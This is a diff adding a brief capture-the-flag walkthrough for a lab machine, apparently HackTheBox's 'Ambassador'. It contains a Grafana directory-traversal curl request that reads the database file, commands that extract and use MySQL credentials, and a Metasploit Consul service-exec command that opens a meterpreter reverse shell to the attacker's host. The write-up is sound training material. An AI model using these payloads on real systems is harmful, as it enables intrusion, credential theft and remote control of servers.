@@ -1,0 +1,43 @@
+Save the ip on /etc/hosts
+
+The first thing was to search for an exploit for grafana and there was a "directory traversal file read"
+
+# https://www.exploit-db.com/exploits/50581
+
+With further reading on the next link i found the common directories and with that i download a db file
+# https://github.com/grafana/grafana/blob/main/conf/defaults.ini
+
+# curl --path-as-is http://ambassador.htb:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
+
+Analyzing the db file i found a mysql passwd
+
+# sqlite3 grafana.db
+# .tables
+# select * from data_source;
+
+With this the next thing to do is to access the db
+
+# mysql -h ambassador.htb -u grafana -p
+# show databases;
+# use whackywidget;
+# show tables;
+# select * from users;
+
+And that's how you get the user :)
+
+
+**ROOT PRIV ESCALATION**
+
+In the opt directory there are two files named consul & my-app and the second has some logs
+
+# git show	// The red letters shows a token that we'll use latter
+
+The other file name is 'consul' and doing some research i found that has a msf exploit
+# https://blog.pentesteracademy.com/hashicorp-consul-remote-command-execution-via-services-api-d709f8ac3960
+
+With this we have the enough info to get root shell
+
+# ssh -L 8500:0.0.0.0:8500 developer@ambassador.htb
+# msfconsole"use multi/misc/consul_service_exec; set payload linux/x86/meterpreter/reverse_tcp;set rhosts 127.0.0.1; set lhost [Your_IP]; set acl_token [the token]; set lport 9090; exploit"
+And that's how you get root shell :D
+
